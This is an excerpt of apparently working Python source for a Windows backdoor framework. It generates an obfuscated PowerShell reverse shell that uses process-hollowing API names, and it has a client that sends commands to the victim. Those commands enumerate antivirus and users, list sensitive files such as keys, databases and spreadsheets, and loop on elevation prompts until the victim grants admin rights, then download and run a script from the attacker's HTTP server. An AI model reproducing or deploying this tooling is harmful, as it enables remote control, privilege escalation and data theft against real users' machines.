...
class Generator:
    ...
    def character_2_string_no_math(self, passed_object):
        command = passed_object if isinstance(passed_object, str) else passed_object.group(0)[1:-1]
    ...
    def generate_shell(self):
        with open("core/payload/ps1/template2.txt", "r") as f:
        ...
        variables_2_replace = ["GetProcAddressVar",
                               ...
                               "2unsafeMethodsType",
                               "3nativeMethodsType",
                               "4startupInformationType",
                               "6CreateProcess",
                               "5processInformationType",
                               "8ReadProcessMemoryAddr",
                               "7ResumeThreadAddr",
                               "9WriteProcessMemoryAddr",
                               "8ZwQueryInformationProcessAddr",
                               "3ResumeThread",
                               "6WriteProcessMemory",
                               "ReadProcessMemory1",
                               ...
                               "hThread5",
                               "hProcess6",
                               "processBasicInformation7",
                               "imageBaseAddrPEB",
                               "memoryBuffer",
                               "imageBaseAddr9",
                               "imageBaseAddrPointer",
                               "peOffset",
                               "entryPointAddrRelative",
                               "entryPointAddr4"]
        ...
        reverse_shell = reverse_shell.replace("IP_ADDRESS", " "+" ".join([hex(int(i))[2:].zfill(2) for i in self.settings.backdoor_server_address[0].split(".")]))
        reverse_shell = reverse_shell.replace("PORT", " "+" ".join([hex(self.settings.backdoor_server_address[1])[2:].zfill(4)[i:i+2] for i in range(0, 4, 2)]))

        for match in range(int(reverse_shell.count("/")/2)):
            reverse_shell = re.sub(pattern, lambda m: random.choice([self.list_2_character_2_string, self.character_2_string_no_math, self.random_string_2_string])(m), reverse_shell, count=1)
...
class BackdoorClient:
	...
	self.settings = settings
        ...
        self.powershell_commands = {
            ...
            'get-antivirus':self.get_antivirus,
            'get-ip':self.get_ip,
    ...
    def get_ip(self):
        return """(iwr -useb -uri "https://api.ipify.org/").content|out-string"""
    
    def get_users(self):
        return "glu|select *|out-string"
    
    def get_files(self):
        return f"ls -recurse -include *.doc, *.pdf, *.json, *.pem, *.xlsx, *.xls, *.csv, *.txt ,*.db, *.exe|select -exp fullname"
    
    def is_admin(self):
        return "$(new-object security.principal.windowsprincipal([security.principal.windowsidentity]::getcurrent())).isinrole([security.principal.windowsbuiltinrole]::administrator)"

    def force_admin(self):
        return """while($true){try{start powershell -verb runas -arg "-wi h -command `"`$a=(new-object system.net.webclient).downloadString('http://HTTP_ADDR/SCRIPT_NAME'); iex `$a`"";break;}catch{echo ''}}""".replace("HTTP_ADDR", str(self.settings.http_server_address[1])).replace("SCRIPT_NAME", self.settings.script_name)
    ...
    def send_commands(self):
        while not self.shutdown:
            try:
                command = input()
                if command.lower() in self.powershell_commands:
                    self.client.send((self.powershell_commands[command.lower()]()+"\n").encode())
                else:
